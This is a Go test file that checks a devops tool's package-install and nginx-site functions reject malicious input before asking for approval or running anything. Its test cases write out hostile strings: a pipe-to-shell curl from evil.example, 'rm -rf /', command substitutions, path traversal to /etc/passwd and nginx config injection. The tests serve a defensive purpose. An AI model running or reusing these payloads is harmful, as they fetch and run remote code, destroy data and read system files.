package devops

import (
	"context"
	"strings"
	"testing"
)

// approvalSpy records whether approval was requested.
func approvalSpy(asked *bool) func(string) bool {
	return func(string) bool { *asked = true; return true }
}

func TestInstallPackage_RejectsInjectionBeforeApproval(t *testing.T) {
	for _, bad := range []string{
		"nginx; curl https://evil.example/x | sh",
		"nginx && rm -rf /",
		"$(reboot)",
		"`id`",
		"-o APT::Get::Allow-Unauthenticated=true nginx", // option injection
		"nginx|true",
		// (A newline is just whitespace: "nginx\nreboot" becomes two quoted
		// package names, 'nginx' 'reboot', which can't run anything.)
		"",
	} {
		r := &stubRunner{}
		s := newTestServer(t, r)
		var asked bool
		s.SetApprover(approvalSpy(&asked))
		before := r.lastCmd
		if err := s.InstallPackage(context.Background(), bad); err == nil {
			t.Errorf("InstallPackage(%q) succeeded", bad)
		}
		if asked {
			t.Errorf("InstallPackage(%q) asked for approval of an invalid name", bad)
		}
		if r.lastCmd != before {
			t.Errorf("InstallPackage(%q) ran %q on the host", bad, r.lastCmd)
		}
	}
}

func TestInstallPackage_MultipleAndVersionedNames(t *testing.T) {
	r := &stubRunner{}
	s := newTestServer(t, r)
	var approval string
	s.SetApprover(func(a string) bool { approval = a; return true })
	if err := s.InstallPackage(context.Background(), "nginx certbot python3-certbot-nginx=2.1.0-1 libc6:amd64"); err != nil {
		t.Fatal(err)
	}
	want := "apt-get install -y 'nginx' 'certbot' 'python3-certbot-nginx=2.1.0-1' 'libc6:amd64'"
	if !strings.Contains(r.lastCmd, want) {
		t.Errorf("command = %q, want %q", r.lastCmd, want)
	}
	// The approval prompt shows the exact command that will run.
	if !strings.Contains(approval, want) {
		t.Errorf("approval %q doesn't show the command", approval)
	}
}

func TestNginx_RejectsTraversalAndInjectionBeforeApproval(t *testing.T) {
	ctx := context.Background()
	badDomains := []string{"../../passwd", "a/b", "..", "x..y", "a b", "a;b", "example.com;", "-x.com", "a.-b.com", ""}
	for _, d := range badDomains {
		for name, call := range map[string]func(*NginxManager) error{
			"AddSite":    func(n *NginxManager) error { return n.AddSite(ctx, d, "http://localhost:3000", false) },
			"RemoveSite": func(n *NginxManager) error { return n.RemoveSite(ctx, d) },
			"EnableSSL":  func(n *NginxManager) error { return n.EnableSSL(ctx, d, "admin@x.com") },
		} {
			r := &writeRecorder{}
			n := newTestNginx(t, r)
			var asked bool
			n.server.SetApprover(approvalSpy(&asked))
			before := r.lastCmd
			if err := call(n); err == nil {
				t.Errorf("%s(%q) succeeded", name, d)
			}
			if asked || r.writtenPath != "" || r.lastCmd != before {
				t.Errorf("%s(%q): asked=%v wrote=%q ran=%q", name, d, asked, r.writtenPath, r.lastCmd)
			}
		}
	}
}

func TestNginx_AddSiteRejectsBadUpstream(t *testing.T) {
	for _, up := range []string{
		"http://localhost:3000; } server { listen 80; root /",
		"file:///etc/passwd",
		"localhost:3000",
		"http://user:pw@localhost",
		"http://localhost:3000/x?y=1",
		"http://local host",
		"http://localhost:30a0",
	} {
		r := &writeRecorder{}
		n := newTestNginx(t, r)
		n.server.SetApprover(approveAll)
		if err := n.AddSite(context.Background(), "example.com", up, false); err == nil {
			t.Errorf("AddSite upstream %q accepted", up)
		}
		if r.writtenPath != "" {
			t.Errorf("upstream %q: config written to %q", up, r.writtenPath)
		}
	}
}

func TestValidDomain_Accepts(t *testing.T) {
	for _, d := range []string{"example.com", "a.b.example.co.uk", "*.example.com", "xn--bcher-kva.example", "localhost", "my-app1.example.io"} {
		if err := validDomain(d); err != nil {
			t.Errorf("validDomain(%q) = %v", d, err)
		}
	}
	for _, up := range []string{"http://localhost:3000", "https://10.0.0.5:8443", "http://[::1]:8080", "http://app.internal/"} {
		if err := validUpstream(up); err != nil {
			t.Errorf("validUpstream(%q) = %v", up, err)
		}
	}
}
